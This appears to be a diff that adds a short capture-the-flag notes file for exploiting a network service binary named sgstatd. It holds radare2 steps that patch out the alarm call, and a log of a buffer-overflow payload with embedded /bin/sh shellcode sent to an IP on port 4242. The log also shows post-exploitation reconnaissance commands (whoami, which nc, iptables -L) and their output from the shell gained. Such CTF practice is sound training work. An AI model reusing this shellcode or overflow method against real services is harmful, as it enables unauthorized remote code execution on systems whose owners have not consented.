@@ -1,0 +1,33 @@
+5:
+file ./usr/bin/sgstatd
+
+sudo mkdir -p /var/run/sgstatd
+
+remove alarm from sgstat
+aaa
+afl~alarm
+s sym.imp.alarm
+axt
+s 0x8049743
+pd 5
+wx 9090909090
+pd 10
+
+
+[+] Opening connection to 54.233.105.81 on port 4242: Done
+[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAA�aaak\x93\x01۳\xa6j\x03YIj?X̀u�jhh///sh/binj\x0bX\x89x99̀ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
+ZZZZZZZZZZZZZZZZZ
+[*] Sending: whoami;ls;pwd;which nc;which python;iptables -L
+sh: 1:
+Z: not found
+
+nobody
+/run/sgstatd
+/bin/nc
+/usr/bin/python
+iptables v1.4.21: can't initialize iptables table `filter': Permission denied (you must be root)
+Perhaps iptables or your kernel needs to be upgraded.
+
+True
+DONE!!
